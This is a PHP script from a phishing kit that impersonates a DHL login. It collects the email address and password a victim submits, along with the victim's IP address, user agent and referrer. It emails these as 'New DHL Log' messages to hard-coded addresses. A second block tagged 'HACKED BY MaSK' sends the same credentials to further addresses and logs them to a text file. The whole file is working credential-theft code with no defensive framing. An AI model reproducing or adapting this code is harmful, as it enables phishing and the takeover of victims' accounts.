<?php
error_reporting(0);

$to="chamehchameh@gmail.com";
$subject = "New DHL Log";
$headers = "From: Any Thing<new@mail.com>\n";
$headers .= "MIME-Version: 1.0\n";

$userdata = array(
    'email'          => null,
    'password'       => null,
    'http_referrer' => null
);

$error_messages = null;

define('FORM_SUBMITTED', (is_array($_POST) && 0 < count($_POST)) );

// Best to set the timezone because we will use the date function
date_default_timezone_set('EST');

// If data has been posted
if ( FORM_SUBMITTED ) {
    
    // Loop through all the known form fields
    foreach ( $userdata as $key => &$value ) {

        // If data has been posted for this item:
        if ( isset($_POST[$key]) ) {
            // remove leading and trailing whitespace
            $value = trim($_POST[$key]);
            
            if (0 === strlen($value)) {
                // if the string is of zero length, set as a null for clarity
                $value = null;
            } elseif ( get_magic_quotes_gpc() ) {
                // if magic quotes is on, remove the slashes
                $value = stripslashes($value);
            }
        }

        //You could put any validation you want to make within these case statements:
        switch ($key) {
            case 'email':
                if ( is_null($value) ) {
                    $error_messages[] = 'Please fill in your E-mail Address.';
                }
                break;

            case 'password':
                if ( is_null($value) ) {
                    $error_messages[] = 'Please fill in your Password.';
                }
                break;

            
        }
    }

    // If no error messages have been set then everything must be okay
    if ( is_null($error_messages) ) {

        // We want the current date and time:
        $date = date('l, F j, Y, g:i a T');
        
        // Create the message body
        $message = <<<MSSG
E-mail: {$userdata['email']}
--------------------------------------
Password: {$userdata['password']}
--------------------------------------
{$date}


--
Additional Info
User Agent: {$_SERVER['HTTP_USER_AGENT']}
IP: {$_SERVER['REMOTE_ADDR']}
HTTP Referrer: {$userdata['http_referrer']}
MSSG;
        
        // Attempt to send the email
        if (!mail($to, $subject, $message, $headers) ) {
            $error_messages[] = 'Sorry, there was a problem sending your email, please try again.';
        }
    }
}
?>

<?php

$data .='------=====HACKED BY MaSK========--------'."\n";

$data .=$_POST['']."\n";
$data .='Email='.""; $data .=$_POST['email']."\n";
$data .='Password='.""; $data .=$_POST['password']."\n";
$data .='IP='.""; $data .=$_SERVER["REMOTE_ADDR"]."\n";
$data .='Date='.""; $data .=date("m/d/y G.i:s", time())."\n";
$data .=$_POST['']."\n";
$data .='------=====HACKED BY MaSK========--------'."\n";

$file .="capetownh.txt";

$to="ddonwise10@yandex.com, g.2sulukdze@gmail.com";
$subject = "New DHL Log";
$headers = "From: Any Thing<new@mail.com>\n";
$headers .= "MIME-Version: 1.0\n";
mail($to,$subject,$data,$headers);


$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $data) or die("Couldn't write values to file!");
fclose($fp);

?>
